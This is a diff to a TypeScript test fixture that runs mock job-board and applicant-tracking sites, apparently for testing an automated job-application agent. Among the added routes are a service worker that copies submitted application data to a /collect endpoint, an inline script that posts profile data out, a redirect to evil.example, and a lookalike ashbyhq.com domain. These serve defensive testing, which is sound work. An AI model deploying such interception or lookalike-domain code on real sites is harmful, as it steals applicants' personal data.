@@ -9,12 +9,16 @@ export interface FixtureSubmission {
 export interface CareerFixtures {
   baseUrl: string;
   atsUrl: string;
+  jobicyAshbyUrl: string;
   close(): Promise<void>;
   submissions: FixtureSubmission[];
   readonly loginCount: number;
   readonly exfilCount: number;
+  readonly websocketAttempts: number;
   readonly unknownVisits: number;
+  readonly applyScriptVisits: number;
   resolveChallenge(): void;
+  resolveAshbyChallenge(): void;
   resolveMfa(): void;
   resolveUnknownAnswer(value: string): void;
 }
@@ -55,14 +59,33 @@ export async function startCareerFixtures(): Promise<CareerFixtures> {
   const submissions: FixtureSubmission[] = [];
   let loginCount = 0;
   let exfilCount = 0;
+  let websocketAttempts = 0;
   let unknownVisits = 0;
+  let applyScriptVisits = 0;
   let unknownAnswer = "";
   let challengeSolved = false;
+  let ashbyChallengeSolved = false;
   let mfaSolved = false;
   let atsUrl = "";
+  let baseUrl = "";
   const ats = createServer(async (req, res) => {
     const path = new URL(req.url || "/", "http://fixture.invalid").pathname;
     if (path === "/collect") { exfilCount++; await read(req); page(res, "collected"); return; }
+    if (path === "/ashby-challenge-state") { res.writeHead(200, { "Content-Type": "text/plain" }); res.end(ashbyChallengeSolved ? "solved" : "pending"); return; }
+    if (path === "/ashby-job") { page(res, `<main><h1>Software Engineer</h1><a href="/ashby-application">Apply for this job</a></main>`); return; }
+    if (path === "/recruitee-job") { page(res, `<main><h1>Platform Engineer</h1><a href="/recruitee-application">Apply for this job</a></main>`); return; }
+    if (path === "/recruitee-application") { page(res, `<main><h1>Apply for Platform Engineer</h1><form action="/submit" method="post" enctype="multipart/form-data">${identity}${cv}<label>Are you legally allowed to work in France? <select name="legal_work_authorized" required><option value="">Select</option><option>Yes</option><option>No</option></select></label><button type="submit">Submit application</button></form></main>`); return; }
+    if (path === "/workable-job") { page(res, `<main><h1>Customer Success Lead</h1><a href="/workable-application">Apply for this job</a></main>`); return; }
+    if (path === "/workable-application") { page(res, `<main><h1>Apply for Customer Success Lead</h1><form action="/submit" method="post" enctype="multipart/form-data">${identity}${cv}<label>Are you available during US business hours? <select name="available_us_hours" required><option value="">Select</option><option>Yes</option><option>No</option></select></label><button type="submit">Submit application</button></form></main>`); return; }
+    if (path === "/smartrecruiters-job") { page(res, `<main><h1>Sales Manager</h1><a href="/smartrecruiters-application">I'm interested</a></main>`); return; }
+    if (path === "/smartrecruiters-application") { page(res, `<main><h1>Apply for Sales Manager</h1><form action="/submit" method="post" enctype="multipart/form-data">${identity}${cv}<label>Can you work in France? <select name="can_work_in_france" required><option value="">Select</option><option>Yes</option><option>No</option></select></label><button type="submit">Submit application</button></form></main>`); return; }
+    if (path === "/teamtailor-job") { page(res, `<main><h1>Data Engineer</h1><a href="/jobs/123-data-engineer/applications/new">Become a developer</a></main>`); return; }
+    if (path === "/jobs/123-data-engineer/applications/new") { page(res, `<main><h1>Apply for Data Engineer</h1><form action="/submit" method="post" enctype="multipart/form-data">${identity}${cv}<label>Are you able to work in France? <select name="tt_work_france" required><option value="">Select</option><option>Yes</option><option>No</option></select></label><button type="submit">Submit application</button></form></main>`); return; }
+    if (path === "/workday-job") { page(res, `<main><h1>Engineer</h1><a href="/workday-application">Apply</a></main>`); return; }
+    if (path === "/workday-application") { page(res, `<main><h1>My Information</h1><form action="/submit" method="post" enctype="multipart/form-data">${identity}${cv}<label>Company <input name="employment_0_company"></label><label>Position <input name="employment_0_position"></label><label>Start date <input name="employment_0_start_date"></label><label>End date <input name="employment_0_end_date"></label><label>Responsibilities <textarea name="employment_0_responsibilities"></textarea></label><label>Company <input name="employment_1_company"></label><label>Position <input name="employment_1_position"></label><label>Start date <input name="employment_1_start_date"></label><label>End date <input name="employment_1_end_date"></label><label>Responsibilities <textarea name="employment_1_responsibilities"></textarea></label><label>School name <input name="education_0_school"></label><label>Degree <input name="education_0_degree"></label><label>Education start date <input name="education_0_start_date"></label><label>Education end date <input name="education_0_end_date"></label><button type="button" id="workday-next">Save and Continue</button></form><script>document.querySelector('#workday-next').addEventListener('click',()=>{document.querySelector('#workday-next').outerHTML='<label>Can you work in France? <select name="wd_work_france" required><option value="">Select</option><option>Yes</option><option>No</option></select></label><button type="submit">Submit application</button>'; document.querySelector('h1').textContent='Questions'})</script></main>`); return; }
+    if (path === "/ashby-job-external") { page(res, `<main><h1>Software Engineer</h1><a href="/ashby-external">Apply for this job</a></main>`); return; }
+    if (path === "/ashby-external") { page(res, `<form action="${baseUrl}/submit" method="post" enctype="multipart/form-data">${identity}${cv}<button type="submit">Submit application</button></form><script>fetch("${baseUrl}/collect",{method:"POST",body:"private profile data"}).catch(()=>{})</script>`); return; }
+    if (path === "/ashby-application") { page(res, `<main><h1 id="status">Verify you are human</h1><div class="captcha">CAPTCHA</div><form action="/submit" method="post" enctype="multipart/form-data">${identity}${cv}<label>Country <select name="country" required><option value="">Select</option><option>France</option><option>United States</option></select></label><label>Work authorization <select name="workAuthorization" required><option value="">Select</option><option>Yes</option><option>No</option></select></label><label>Visa sponsorship <select name="visa_sponsorship" required><option value="">Select</option><option>Yes</option><option>No</option></select></label><label>Why this role? <textarea name="motivation" required></textarea></label><label>Gender (optional) <select name="gender"><option value="prefer-not-to-say">Prefer not to say</option><option>Female</option><option>Male</option></select></label><button type="submit">Submit application</button></form><script>setInterval(()=>fetch('/ashby-challenge-state').then(r=>r.text()).then(s=>{if(s==='solved'){document.querySelector('.captcha')?.remove();document.querySelector('#status').textContent='Apply for this job'}}),100)</script></main>`); return; }
     if (path === "/ats-apply" && !req.headers.cookie?.includes("ats=1")) { res.writeHead(302, { Location: "/ats-login" }); res.end(); return; }
     if (path === "/ats-login" && req.method === "POST") {
       const fields = new URLSearchParams((await read(req)).toString());
@@ -72,9 +95,11 @@ export async function startCareerFixtures(): Promise<CareerFixtures> {
     }
     if (path === "/ats-login") { page(res, `<form action="/ats-login" method="post"><label>Username <input name="username" required></label><label>Password <input type="password" name="password" required></label><button type="submit">Sign in</button></form>`); return; }
     if (path === "/ats-apply") { page(res, simple("/submit")); return; }
+    if (path === "/remoteok-application") { page(res, simple("/submit")); return; }
     if (path === "/submit" && req.method === "POST") { submissions.push(parseSubmission(req, await read(req), path)); page(res, `<h1>Application received</h1><p>Reference: ATS-${submissions.length}</p>`); return; }
     page(res, "<h1>Not found</h1>");
   });
+  ats.on("upgrade", (_req, socket) => { websocketAttempts++; socket.destroy(); });
   await new Promise<void>(resolve => ats.listen(0, "127.0.0.1", resolve));
   const atsAddress = ats.address();
   if (!atsAddress || typeof atsAddress === "string") throw new Error("ATS fixture did not listen");
@@ -82,6 +107,36 @@ export async function startCareerFixtures(): Promise<CareerFixtures> {
   const server = createServer(async (req, res) => {
     const url = new URL(req.url || "/", "http://fixture.invalid");
     const path = url.pathname;
+    if (path === "/service-worker.js") {
+      res.writeHead(200, { "Content-Type": "text/javascript; charset=utf-8" });
+      res.end(`
+        self.addEventListener('install', event => event.waitUntil(self.skipWaiting()));
+        self.addEventListener('activate', event => event.waitUntil(self.clients.claim()));
+        self.addEventListener('fetch', event => {
+          if (new URL(event.request.url).pathname !== '/submit') return;
+          event.respondWith((async () => {
+            const forwarded = event.request.clone();
+            const payload = await event.request.clone().arrayBuffer();
+            await fetch('${atsUrl}/collect', { method: 'POST', body: payload, mode: 'no-cors' }).catch(() => {});
+            return fetch(forwarded);
+          })());
+        });
+      `);
+      return;
+    }
+    if (path === "/service-worker-job") {
+      page(res, `<h1>Service worker test</h1><a id="apply" hidden href="/service-worker-application">Apply for this job</a>`);
+      return;
+    }
+    if (path === "/service-worker-application") { page(res, simple("/submit")); return; }
+    if (path === "/assets/application-form.js") {
+      applyScriptVisits++;
+      res.writeHead(200, { "Content-Type": "text/javascript; charset=utf-8" });
+      // Mirrors the public ATS pattern: a job detail page's visible Apply link opens a
+      // same-vendor application page whose form is hydrated by a first-party JS bundle.
+      res.end(`document.querySelector('#application').innerHTML = ${JSON.stringify(simple("/submit"))};`);
+      return;
+    }
     if (path === "/challenge-state" || path === "/mfa-state" || path === "/unknown-answer-state") {
       res.writeHead(200, { "Content-Type": "text/plain; charset=utf-8" });
       res.end(path === "/challenge-state" ? (challengeSolved ? "solved" : "pending") : path === "/mfa-state" ? (mfaSolved ? "solved" : "pending") : unknownAnswer);
@@ -103,11 +158,32 @@ export async function startCareerFixtures(): Promise<CareerFixtures> {
       else page(res, `<h1>Application received</h1><p>Reference: REC-${submissions.length.toString().padStart(4, "0")}</p>`);
       return;
     }
+    if (path === "/collect") { exfilCount++; await read(req); page(res, "collected"); return; }
     if (req.method === "GET" && path === "/login-apply" && !req.headers.cookie?.includes("auth=1")) {
       res.writeHead(302, { Location: "/login" }); res.end(); return;
     }
     if (path === "/login") { page(res, `<form action="/login" method="post"><label>Username <input name="username" required></label><label>Password <input type="password" name="password" required></label><button type="submit">Sign in</button></form>`); return; }
     if (path === "/readonly-login") { page(res, `<form action="/login" method="post"><label>Username <input name="username" required></label><label>Password <input type="password" name="password" readonly required></label><button type="submit">Sign in</button></form>`); return; }
+    if (path === "/apply-link") { page(res, `<h1>Software Engineer</h1><a href="/apply-page">Apply for this job</a>`); return; }
+    if (path === "/remoteok-job") { page(res, `<main><h1>Software Engineer</h1><a href="/l/123">Apply</a><a href="/l/123">Apply now</a><a href="/l/123">Apply for this job</a></main>`); return; }
+    if (path === "/l/123") { res.writeHead(302, { Location: `${atsUrl}/remoteok-application` }); res.end(); return; }
+    if (path === "/remoteok-unsafe-job") { page(res, `<main><h1>Software Engineer</h1><a href="/l/999">Apply for this job</a></main>`); return; }
+    if (path === "/l/999") { res.writeHead(302, { Location: "https://evil.example/collect" }); res.end(); return; }
+    if (path === "/jobicy-discovered") { page(res, `<main><h1>Software Engineer</h1><a href="${atsUrl}/ashby-job">Apply for this job</a></main>`); return; }
+    if (path === "/himalayas-job") { page(res, `<main><h1>Product Manager</h1><a href="/simple">Apply for this job</a></main>`); return; }
+    if (path === "/jobicy-recruitee") { page(res, `<main><h1>Platform Engineer</h1><a href="${atsUrl}/recruitee-job">Apply for this job</a></main>`); return; }
+    if (path === "/jobicy-workable") { page(res, `<main><h1>Customer Success Lead</h1><a href="${atsUrl}/workable-job">Apply for this job</a></main>`); return; }
+    if (path === "/jobicy-smartrecruiters") { page(res, `<main><h1>Sales Manager</h1><a href="${atsUrl}/smartrecruiters-job">Apply for this job</a></main>`); return; }
+    if (path === "/jobicy-teamtailor") { page(res, `<main><h1>Data Engineer</h1><a href="${atsUrl}/teamtailor-job">Apply for this job</a></main>`); return; }
+    if (path === "/jobicy-workday") { page(res, `<main><h1>Engineer</h1><a href="${atsUrl}/workday-job">Apply for this job</a></main>`); return; }
+    if (path === "/jobicy-ashby-lookalike") { page(res, `<main><h1>Software Engineer</h1><a href="https://jobs.ashbyhq.com.evil.example/acme/123">Apply for this job</a></main>`); return; }
+    if (path === "/jobicy-ashby-external") { page(res, `<main><h1>Software Engineer</h1><a href="${atsUrl}/ashby-job-external">Apply for this job</a></main>`); return; }
+    if (path === "/ambiguous-apply") { page(res, `<h1>Software Engineer</h1><a href="/apply-page">Apply now</a><a href="/apply-page?source=secondary">Apply for this job</a>`); return; }
+    if (path === "/apply-page") { page(res, `<h1>Application</h1><main id="application"></main><script src="/assets/application-form.js"></script>`); return; }
+    if (path === "/lever-job") { page(res, `<main><h1>Product Engineer</h1><a href="/lever-job/apply">Apply for this job</a></main>`); return; }
+    if (path === "/lever-job/apply") { page(res, `<main><h1>Submit your application</h1><form action="/submit" method="post" enctype="multipart/form-data"><label>Resume/CV <input type="file" name="resume" required></label><label>Full name <input name="fullName" autocomplete="name" required></label><label>Email <input type="email" name="email" required></label><label>Phone <input type="tel" name="phone" required></label><label>Current location <input name="location"></label><label>LinkedIn URL <input type="url" name="urls[LinkedIn]"></label><button type="submit">Submit application</button></form></main>`); return; }
+    if (path === "/greenhouse-application") { page(res, `<main><h1>Apply for this Job</h1><form action="/submit" method="post" enctype="multipart/form-data"><label>First Name <input name="first_name" required></label><label>Last Name <input name="last_name" required></label><label>Email <input type="email" name="email" required></label><label>Phone <input type="tel" name="phone_number"></label><label>Resume/CV <input type="file" name="resume" required></label><label>Are you currently eligible to work in the United States? * <select name="custom_work_authorized" required><option value="">Select</option><option>Yes</option><option>No</option></select></label><button type="submit">Submit application</button></form></main>`); return; }
+    if (path === "/profile-history") { page(res, `<main><h1>Application history</h1><form action="/submit" method="post" enctype="multipart/form-data">${identity}${cv}<label>Employer <input name="employment_0_company" required></label><label>Position <input name="employment_0_position" required></label><label>Start date <input name="employment_0_start_date" required></label><label>End date <input name="employment_0_end_date"></label><label>Responsibilities <textarea name="employment_0_responsibilities"></textarea></label><label>Employer <input name="employment_1_company" required></label><label>Position <input name="employment_1_position" required></label><label>Start date <input name="employment_1_start_date" required></label><label>End date <input name="employment_1_end_date"></label><label>Responsibilities <textarea name="employment_1_responsibilities"></textarea></label><label>School name <input name="education_0_school" required></label><label>Degree <input name="education_0_degree"></label><label>Education start date <input name="education_0_start_date"></label><label>Education end date <input name="education_0_end_date"></label><button type="submit">Submit application</button></form></main>`); return; }
     if (path === "/simple" || path === "/login-apply" || path === "/alternate") { page(res, simple("/submit")); return; }
     if (path === "/weird-cv") { page(res, `<form action="/submit" method="post" enctype="multipart/form-data">${identity}<span id="resume-label">Upload your CV</span><input aria-labelledby="resume-label" type="file" name="attachment" required><button type="submit">Send application</button></form>`); return; }
     if (path === "/portfolio") { page(res, `<form action="/submit" method="post" enctype="multipart/form-data">${identity}<label>Portfolio document <input type="file" name="portfolio" required></label><button type="submit">Send application</button></form>`); return; }
@@ -134,14 +210,19 @@ export async function startCareerFixtures(): Promise<CareerFixtures> {
   await new Promise<void>(resolve => server.listen(0, "127.0.0.1", resolve));
   const address = server.address();
   if (!address || typeof address === "string") throw new Error("Fixture server did not listen");
+  baseUrl = `http://127.0.0.1:${address.port}`;
   return {
-    baseUrl: `http://127.0.0.1:${address.port}`,
+    baseUrl,
     atsUrl,
+    jobicyAshbyUrl: `${baseUrl}/jobicy-discovered`,
     submissions,
     get loginCount() { return loginCount; },
     get exfilCount() { return exfilCount; },
+    get websocketAttempts() { return websocketAttempts; },
     get unknownVisits() { return unknownVisits; },
+    get applyScriptVisits() { return applyScriptVisits; },
     resolveChallenge: () => { challengeSolved = true; },
+    resolveAshbyChallenge: () => { ashbyChallengeSolved = true; },
     resolveMfa: () => { mfaSolved = true; },
     resolveUnknownAnswer: value => { unknownAnswer = value; },
     close: async () => { await new Promise<void>((resolve, reject) => server.close(err => err ? reject(err) : resolve())); await new Promise<void>((resolve, reject) => ats.close(err => err ? reject(err) : resolve())); },
